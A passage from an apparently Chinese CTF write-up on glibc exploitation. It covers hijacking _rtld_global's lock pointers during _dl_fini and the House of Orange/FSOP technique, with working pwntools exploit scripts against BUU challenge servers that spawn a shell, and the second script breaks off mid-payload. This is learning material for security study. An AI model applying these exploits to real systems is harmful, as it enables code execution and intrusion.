GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">         auditing DSOs.  */</span></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">          || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          )</span><br><span class="line">        __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p> <code>__rtld_lock_lock_recursive</code>、<code> __rtld_lock_unlock_recursive</code>是通过宏定义来的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc/sysdeps/nptl/libc-lockP.h</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line">  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __rtld_lock_unlock_recursive(NAME) \</span></span><br><span class="line">  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)</span><br></pre></td></tr></table></figure><p>从上面定义知道真正函数是 GL 宏中的 <code>dl_rtld_lock_recursive</code> ，查看宏 GL 定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Rtld.c</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_local</span></span></span><br><span class="line"><span class="class">    __<span class="title">attribute__</span> ((<span class="title">alias</span> (&quot;_<span class="title">rtld_global</span>&quot;), <span class="title">visibility</span> (&quot;<span class="title">hidden</span>&quot;)));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Ldsodefs.h</span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_local</span> __<span class="title">rtld_local_attribute__</span>;</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">undef</span> __rtld_local_attribute__</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> __<span class="title">rtld_global_attribute__</span>;</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">undef</span> __rtld_global_attribute__</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Db_info.c</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> <span class="title">rtld_global</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//elf/Rtld.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span> _<span class="title">rtld_global</span> =</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Generally the default presumption without further information is an</span></span><br><span class="line"><span class="comment">     * executable stack but this is not true for all platforms.  */</span></span><br><span class="line">    ._dl_stack_flags = DEFAULT_STACK_PERMS,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC_REENTRANT</span></span><br><span class="line">    ._dl_load_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,</span><br><span class="line">    ._dl_load_write_lock = _RTLD_LOCK_RECURSIVE_INITIALIZER,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ._dl_nns = <span class="number">1</span>,</span><br><span class="line">    ._dl_ns =</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC_REENTRANT</span></span><br><span class="line">      [LM_ID_BASE] = &#123; ._ns_unique_sym_table</span><br><span class="line">       = &#123; .lock = _RTLD_LOCK_RECURSIVE_INITIALIZER &#125; &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line"><span class="comment">//Ldsodefs.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> EXTERN extern</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> GL(name) _##name</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> EXTERN</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>有点复杂，这里简化描述一下：从 40-45 知道 GL 是 _rtld_local 或 _rtld_global 类型的结构体；两种结构体定义看上面代码前面部分。所以 GL(dl_rtld_lock_recursive) 是 _rtld_global 结构体内的 dl_rtld_lock_recursive 指针。</p><p>有点绕，先整理下 _dl_fini 调用的实际是什么：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_dl_fini 调用 __rtld_lock_lock_recursive</span><br><span class="line">__rtld_lock_lock_recursive 宏定义为 GL(dl_rtld_lock_recursive)</span><br><span class="line">GL 是一个 _rtld_global 结构体</span><br><span class="line">dl_rtld_lock_recursive 是 _rtld_global 结构体的一个指针</span><br></pre></td></tr></table></figure><p><strong>_dl_fini 实际调用 _rtld_global 结构体的 _dl_rtld_lock_recursive 指针。</strong></p><p>在 gdb 中查看 _rtld_global 信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p _rtld_global#查看结构体内容</span><br><span class="line">p *_rtld_global#查看结构体地址</span><br></pre></td></tr></table></figure><p>在结构体里面找到了实际的调用的函数指针：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212010538.png" alt="image-20201212010538691"></p><p><strong>_rtld_global 是在 ld.so 内存段</strong>里面的，泄露 libc 可以通过偏移计算出 ld 基地址，按照图中偏移应该为 <code>offset=0x7f30c73af000-0x7f30c6df8000=0x5b7000</code>：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212010329.png" alt="image-20201212010329020"></p><p>由于我这里调试时改 libc 和 ld 所以计算出来的偏移 0x5b7000 并不是远程环境（原生18.04运行）下的偏移，在 Ubuntu 18.04 下重新调试计算得出偏移为 <code>0x3f1000</code> ，这个偏移与 buu 上的环境一样：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212164833.png" alt="image-20201212164833238"></p><p>计算出 _rtld_global 的地址通过偏移得到 _dl_rtld_lock_recursive 、_dl_rtld_unlock_recursive 地址。这个偏移我是 gdb 查看 _rtld_global 地址，不断加偏移找：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_dl_rtld_lock_lock_recursive -&gt; <span class="number">0xf00</span></span><br><span class="line">_dl_rtld_lock_unlock_recursive -&gt; <span class="number">0xf08</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201212165907.png" alt="image-20201212165906952"></p><p>两个函数都会调用，将其指针改成 onegadget ，最后尝试 _dl_rtld_unlock_recursive 才满足 onegadget 条件。</p><p><strong>EXP</strong> 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#remote:ubuntu18.04</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,</span><br><span class="line">terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process([&quot;/glibc/2.27/64/lib/ld-2.27.so&quot;, &quot;./the_end&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.27/64/lib/libc-2.27.so&quot;&#125;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;/glibc/2.27/64/lib/libc-2.27.so&quot;)</span></span><br><span class="line"><span class="comment">#ld = ELF(&quot;/glibc/2.27/64/lib/ld-2.27.so&quot;)</span></span><br><span class="line"><span class="comment"># p = process(&quot;./the_end&quot;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># ld = ELF(&quot;/lib/x86_64-linux-gnu/ld-2.27.so&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27518</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/ld-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./the_end&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset_ldbase_of_libcbase = <span class="number">0x3f1000</span><span class="comment">#0x5b7000</span></span><br><span class="line">offset_dl_rtld_lock_recursive_of_rtld_global = <span class="number">0xf00</span></span><br><span class="line">offset_dl_rtld_unlock_recursive_of_rtld_global = <span class="number">0xf08</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;gift &quot;</span>)</span><br><span class="line">sleep_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;sleep_addr:&quot;</span>+<span class="built_in">hex</span>(sleep_addr))</span><br><span class="line">libc_base = sleep_addr-libc.sym[<span class="string">&#x27;sleep&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">ld_base = libc_base+offset_ldbase_of_libcbase</span><br><span class="line">log.info(<span class="string">&quot;ld_base:&quot;</span>+<span class="built_in">hex</span>(ld_base))</span><br><span class="line">rtld_global = ld_base+ld.sym[<span class="string">&#x27;_rtld_global&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;rtld_global:&quot;</span>+<span class="built_in">hex</span>(rtld_global))</span><br><span class="line">dl_rtld_lock_recursive = rtld_global+offset_dl_rtld_lock_recursive_of_rtld_global</span><br><span class="line">log.info(<span class="string">&quot;dl_rtld_lock_recursive:&quot;</span>+<span class="built_in">hex</span>(dl_rtld_lock_recursive))</span><br><span class="line">dl_rtld_unlock_recursive = rtld_global+offset_dl_rtld_unlock_recursive_of_rtld_global</span><br><span class="line">log.info(<span class="string">&quot;dl_rtld_unlock_recursive_of_rtld_global:&quot;</span>+<span class="built_in">hex</span>(dl_rtld_unlock_recursive))</span><br><span class="line"></span><br><span class="line">onegadget = libc_base+<span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x964)&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line"><span class="comment">#p.send(p64(dl_rtld_lock_recursive+i))</span></span><br><span class="line">p.send(p64(dl_rtld_unlock_recursive+i))</span><br><span class="line">p.send(p64(onegadget)[i])</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;exec 1&gt;&amp;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>house of orange 特殊之处是题目没有 free 函数等释放堆块函数。house of orange 核心思想通过漏洞实现 free 的效果。</p><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>能控制 topchunk size 位（堆溢出等）</li><li>能控制堆分配的大小</li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>当 topchunk 不能满足申请分配的大小时，topchunk 被释放进 unsortedbin ，实现没有 free 函数释放堆块。</p><p>扩展堆空间有 <code>mmap</code> 和 <code>brk</code> 两种方式，我们需要以 <code>brk</code> 拓展，需要绕过 libc 一些 check ：<strong>malloc 申请大小不能大于 <code>mmp_.mmap_threshold</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure><p>总结伪造 topchunk 要求：</p><ul><li><p>伪造 size 需要对齐内存页</p><p>比如现在 topchunk size 为：<code>0x20fa1</code>，那么对齐内存页的 size 可以为：0xfa1、0x1fa1……</p></li><li><p>size 要大于 MINSIZE</p></li><li><p>prev_inuse 为 1</p></li><li><p>size 要小于等等申请 chunk_size+MINISIZE （才能让 topchunk 放入 unsortedbin）</p></li></ul><p>自此得到一个 unsortedbin 堆，用来泄露 libc 地址，实现 FSOP</p><h3 id="hitcon-2016-houseoforange"><a href="#hitcon-2016-houseoforange" class="headerlink" title="hitcon_2016_houseoforange"></a>hitcon_2016_houseoforange</h3><h4 id="基本情况-2"><a href="#基本情况-2" class="headerlink" title="基本情况"></a>基本情况</h4><p>保护全开，实验环境在 Ubuntu16.04。</p><p>能自主控制分配堆大小，结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  *info;</span><br><span class="line">  chunk_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span>&#123;</span></span><br><span class="line">  price;</span><br><span class="line">  color;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 edit 函数中存在堆溢出：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216230021.png" alt="image-20201216230021762"></p><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>利用堆溢出将 topchunk size 改小，size 要求看前文。修改前 topchunk 和 heap 范围：</p><p>![image-20201216231726321](../../../../../Library/Application Support/typora-user-images/image-20201216231726321.png)</p><p>修改后情况：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216231929.png" alt="image-20201216231929179"></p><p>之后申请一个大于 topchunk 的堆，topchunk 就被放入 unsortedbin ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555557580a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557580a0</span><br></pre></td></tr></table></figure><p>申请一个 largebin 用于泄露 libc 和 堆地址。用的 malloc 分配，libc 读取 bk 位置信息即可，分配的是 largebin 在 fd_nextsize 和 bk_nextsize 都存放堆地址分别读出即可。堆地址在 FSOP 伪造 vtable 需要用到。</p><p>自此后面就是 FSOP 利用。劫持在 libc 中的 _IO_list_all 内容，将其内容指向可控地址伪造 _IO_FILE_plus 和 vtabel 。默认状态下的 _IO_list_all 指向的是 _IO_2_1_stderr_ ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216232611.png" alt="image-20201216232610931"></p><p>利用堆溢出修改在 unsortedbin 的 topchunk fd bk 指针，发起 unsortedbin attack 劫持 _IO_list_all 。这里修改完 fd bk 之后申请一个堆，topchunk unlink 就会修改 _IO_list_all 指向到 main_arena+88 ，这个区域前后我们还是不能控制，就利用 _chain 标志位指向下一个文件流，这个标志位的位置刚好是 unsortedbin 0x60 链表位置。因此将 topchunk size 覆盖为 0x60 ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201216234838.png" alt="image-20201216234838174"></p><p>执行 _IO_flush_all_lockp 时逐个遍历文件流，遇到错误文件就跳过去处理 _chain 指向的下一个文件流，因此现在 topchunk 里面伪造一个 _IO_FILE_plus 结构体。</p><p>需要设置几个标志位绕过保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mode_offset=<span class="number">0x0</span>;</span><br><span class="line">writeptr_offset=<span class="number">0x1</span>;</span><br><span class="line">writebase_offset=<span class="number">0x0</span>;</span><br></pre></td></tr></table></figure><p>然后将 vtable 指针劫持会 topchunk 特定位置，让 __overflow 为 system ，文件流（topchunk）头部覆盖为 /bin/sh 作为参数传入。</p><p>成功结构体如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201217000607.png" alt="image-20201217000607071"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201217000644.png" alt="image-20201217000644542"></p><h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./houseoforange_hitcon_2016&quot;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29595</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./houseoforange_hitcon_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content, price, color</span>):</span></span><br><span class="line">command(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">command(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size, content, price, color</span>):</span></span><br><span class="line">command(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Length of name :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Price of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(price))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Color of Orange:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(color))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 &#x27;free&#x27; 2 bin</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line"><span class="comment">#0x555555758000     0x555555779000 rw-p    21000 0      [heap]</span></span><br><span class="line"><span class="comment">#0x555555758000     0x55555579b000 rw-p    43000 0      [heap]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 leak libc</span></span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_addr = leak_addr-<span class="number">1640</span>-<span class="number">0x3c4b20</span></span><br><span class="line">log.info(<span class="string">&quot;libc_addr:&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">IO_list_all=libc_addr+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;IO_list_all:&quot;</span>+<span class="built_in">hex</span>(IO_list_all))</span><br><span class="line">system=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 leak heap</span></span><br><span class="line">payload = <span class="string">&#x27;d&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0x10</span>, payload,<span class="number">0xddaa</span>,<span class="number">0xddaa</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># set fake struct</span></span><br><span class="line">payload=<span 